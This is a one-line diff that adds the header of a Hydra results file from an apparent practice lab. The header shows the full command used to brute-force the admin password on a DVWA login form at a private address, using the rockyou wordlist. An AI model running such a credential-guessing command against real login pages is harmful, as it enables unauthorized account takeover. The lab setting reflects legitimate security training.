@@ -1,0 +1,1 @@
+# Hydra v9.5 run at 2025-08-24 04:17:53 on 192.168.56.102 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -V -f -t 4 -o /home/sarveshdg/lab-dvwa/attacks/hydra_dvwa_login.txt 192.168.56.102 http-post-form /dvwa/login.php:username=^USER^&password=^PASS^:Login failed)
